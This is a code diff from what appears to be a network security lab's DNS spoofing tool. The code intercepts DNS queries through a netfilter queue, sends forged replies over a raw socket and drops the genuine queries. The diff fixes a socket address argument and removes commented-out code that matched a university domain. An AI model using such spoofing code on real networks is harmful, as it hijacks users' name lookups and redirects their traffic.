@@ -518,7 +518,7 @@ void send_spoofed_dns_reply(char *packet)
     socket_address.sll_hatype = htons(ARPHRD_ETHER);
     
     memcpy(socket_address.sll_addr, source_mac_char, 6);
-    sendto(sock_raw_fd, spoofed_packet, total_len + ETHER_HEADER_LEN, 0, (struct sockaddr *)&saddr_ll, sizeof(struct sockaddr_ll));
+    sendto(sock_raw_fd, spoofed_packet, total_len + ETHER_HEADER_LEN, 0, (struct sockaddr *)&socket_address, sizeof(struct sockaddr_ll));
 
     close(sock_raw_fd);
     
@@ -554,7 +554,6 @@ static int dns_nfq_packet_handler(struct nfq_q_handle *qh, struct nfgenmsg *nfms
                 // char *dns_query = (char *)(packet + ip_header->ihl * 4 + sizeof(udphdr) + sizeof(dnshdr));
                 // parse question section: qname qtype qclass
 
-
                 // use stringstream to derive the dns query
                 stringstream ss;
                 for (int i = 0; i < ret; ++i)
@@ -571,31 +570,6 @@ static int dns_nfq_packet_handler(struct nfq_q_handle *qh, struct nfgenmsg *nfms
                     send_spoofed_dns_reply(packet);
                     return nfq_set_verdict(qh, id, NF_DROP, 0, NULL);
                 }
-
-                // string str = "";
-                // int dns_start = ip_header->ihl * 4 + sizeof(udphdr);
-                // int name_mv = dns_start + sizeof(dnshdr);
-                // int qname_len = 5; // qry.type 2 and qry.class :2, and final 0 in qname
-                // while (packet[name_mv] != 0)
-                // {
-                //     int part_len = packet[name_mv];
-                //     qname_len += part_len + 1;
-                //     // cout << "len: " << part_len << '\n';
-                //     for (int j = 0; j < part_len; j++)
-                //     {
-                //         name_mv++;
-                //         str += packet[name_mv];
-                //     }
-                //     name_mv++;
-                //     str += '.';
-                // }
-
-                // if (str.find("www.nycu.edu.tw") != string::npos)
-                // {
-                //     cout << "qname_len: " << qname_len << '\n';
-                //     send_spoofed_dns_reply(packet, ret, qname_len);
-                //     return nfq_set_verdict(qh, id, NF_DROP, 0, NULL);
-                // }
             }
         }
     }
